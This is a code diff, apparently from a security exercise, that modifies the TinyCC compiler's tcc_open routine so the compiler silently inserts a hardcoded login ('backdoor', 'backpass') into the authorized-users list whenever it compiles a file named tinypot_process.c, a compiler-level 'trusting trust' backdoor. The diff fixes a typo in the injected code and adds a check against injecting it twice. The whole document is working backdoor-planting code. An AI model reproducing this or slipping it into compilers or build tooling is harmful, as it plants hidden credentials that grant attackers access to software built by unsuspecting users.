@@ -642,23 +642,35 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
             // Add the corruption to temp file
             if (strstr(buf, "fd = open(filename, O_RDONLY | O_BINARY);") != NULL)
             {
-                fputs("\tif (strcmp(filename, \"tinypot_process.c\") == 0)\n", tempFile);
-                fputs("\t{\n", tempFile);
-                fputs("\t\tFILE* oldFile = fopen(filename, \"r\");\n", tempFile);
-                fputs("\t\tFILE* newFile = fopen(\".tempBackDoor\", \"w\");\n", tempFile);
-                fputs("\t\tchar buf[200];\n", tempFile);
-                fputs("\t\twhile (fgets(buf, 200, oldFile) != NULL)\n", tempFile);
-                fputs("\t\t{\n", tempFile);
-                fputs("\t\t\tfputs(buf, newFile);\n", tempFile);
-                fputs("\t\t\tif (strstr(buf, \"AuthData_t authorizedUsers[]\") != NULL)\n", tempFile);
-                fputs("\t\t\t{\n", tempFile);
-                fputs("\t\t\t\tfputs(\"{\\\"backdoor\\\", \\\"backpass\\\"},\", newFile);\n", tempFile);
-                fputs("\t\t\t}\n", tempFile);
-                fputs("\t\t}\n", tempFile);
-                fputs("\t\tfclose(oldFile);\n", tempFile);
-                fputs("\t\tfclose(newFile);\n", tempFile);
-                fputs("\t\tfd = open(\".tempBackDoor\", 0_RDONLY | O_BINARY);\n", tempFile);
-                fputs("\t}\n", tempFile);
+                if (fgets(buf, 200, compilerFile) != NULL)
+                {
+                    if (strstr(buf, "tinypot_process.c") != NULL)
+                    {
+                        printf("%s", buf);
+                        fputs(buf, tempFile);
+                    }
+                    else 
+                    {
+                        fputs("\tif (strcmp(filename, \"tinypot_process.c\") == 0)\n", tempFile);
+                        fputs("\t{\n", tempFile);
+                        fputs("\t\tFILE* oldFile = fopen(filename, \"r\");\n", tempFile);
+                        fputs("\t\tFILE* newFile = fopen(\".tempBackDoor\", \"w\");\n", tempFile);
+                        fputs("\t\tchar buf[200];\n", tempFile);
+                        fputs("\t\twhile (fgets(buf, 200, oldFile) != NULL)\n", tempFile);
+                        fputs("\t\t{\n", tempFile);
+                        fputs("\t\t\tfputs(buf, newFile);\n", tempFile);
+                        fputs("\t\t\tif (strstr(buf, \"AuthData_t authorizedUsers[]\") != NULL)\n", tempFile);
+                        fputs("\t\t\t{\n", tempFile);
+                        fputs("\t\t\t\tfputs(\"{\\\"backdoor\\\", \\\"backpass\\\"},\", newFile);\n", tempFile);
+                        fputs("\t\t\t}\n", tempFile);
+                        fputs("\t\t}\n", tempFile);
+                        fputs("\t\tfclose(oldFile);\n", tempFile);
+                        fputs("\t\tfclose(newFile);\n", tempFile);
+                        fputs("\t\tfd = open(\".tempBackDoor\", O_RDONLY | O_BINARY);\n", tempFile);
+                        fputs("\t}\n", tempFile);
+                        fputs(buf, tempFile);
+                    }
+                }
             }
         }
         fclose(compilerFile);
